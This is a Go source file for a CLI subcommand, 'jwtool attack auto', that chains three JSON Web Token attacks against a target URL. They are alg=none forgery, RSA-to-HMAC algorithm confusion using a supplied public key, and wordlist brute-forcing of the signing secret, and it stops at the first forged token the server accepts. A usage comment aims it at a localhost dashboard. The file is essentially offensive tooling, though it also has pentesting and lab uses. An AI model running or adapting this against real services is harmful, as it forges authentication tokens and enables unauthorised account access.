package cmd

import (
	"fmt"

	"github.com/pikqi/jwtool/internal"
	"github.com/spf13/cobra"
)

var attackAutoCmd = &cobra.Command{
	Use:   "auto <JWT>",
	Short: "Try all attacks in sequence, stop at first success",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		url, _ := cmd.Flags().GetString("url")
		cookie, _ := cmd.Flags().GetString("cookie")
		keyword, _ := cmd.Flags().GetString("keyword")
		pubkey, _ := cmd.Flags().GetString("pubkey")
		wordlist, _ := cmd.Flags().GetString("wordlist")

		jwt := args[0]
		opts := internal.SendOpts{CookieName: cookie, Keyword: keyword}

		// alg=none
		fmt.Println("\n[1/3] Trying alg=none attack...")
		forged, err := internal.ExploitNone(jwt, false)
		if err != nil {
			fmt.Printf("    [!] Forge failed: %v\n", err)
		} else {
			result, err := internal.SendWithJWT(url, forged, opts)
			if err != nil {
				fmt.Printf("    [!] Request failed: %v\n", err)
			} else if result.Success {
				fmt.Printf("    Succeeded — %s\n", result.Reason)
				return nil
			} else {
				fmt.Printf("    Failed — %s\n", result.Reason)
			}
		}

		// confusion
		fmt.Println("\n[2/3] Trying algorithm confusion attack...")
		if pubkey == "" {
			fmt.Println("    [!] Skipping — no --pubkey provided")
		} else {
			forged, err = internal.ExploitAlgorithmConfusion(jwt, pubkey)
			if err != nil {
				fmt.Printf("    [!] Forge failed: %v\n", err)
			} else {
				result, err := internal.SendWithJWT(url, forged, opts)
				if err != nil {
					fmt.Printf("    [!] Request failed: %v\n", err)
				} else if result.Success {
					fmt.Printf("    Succeeded — %s\n", result.Reason)
					return nil
				} else {
					fmt.Printf("    Failed — %s\n", result.Reason)
				}
			}
		}

		// brute
		fmt.Println("\n[3/3] Trying brute force attack...")
		if wordlist == "" {
			fmt.Println("    [!] Skipping — no --wordlist provided")
		} else {
			bruteResult, err := internal.Bruteforce(jwt, wordlist)
			if err != nil {
				fmt.Printf("    [!] Bruteforce failed: %v\n", err)
			} else if bruteResult.Secret == "" {
				fmt.Printf("    Secret not found after %d tries\n", bruteResult.Tried)
			} else {
				fmt.Printf("    Secret found: %q — sending original token...\n", bruteResult.Secret)

				result, err := internal.SendWithJWT(url, jwt, opts)
				if err != nil {
					fmt.Printf("    [!] Request failed: %v\n", err)
				} else if result.Success {
					fmt.Printf("    Succeeded — %s\n", result.Reason)
					return nil
				} else {
					fmt.Printf("    Failed — %s\n", result.Reason)
				}
			}
		}

		fmt.Println("\nAll attacks failed")
		return nil
	},
}

func init() {
	attackAutoCmd.Flags().StringP("pubkey", "p", "", "Path to RSA public key for confusion attack")
	attackAutoCmd.Flags().StringP("wordlist", "w", "", "Path to wordlist for brute force attack")
	attackCmd.AddCommand(attackAutoCmd)
}

/*
jwtool attack auto <JWT> \
  --url http://localhost:5010/dashboard \
  --cookie jwt_token \
  --keyword "Welcome" \
  --pubkey ./public.pem \
  --wordlist ./wordlist.txt
*/
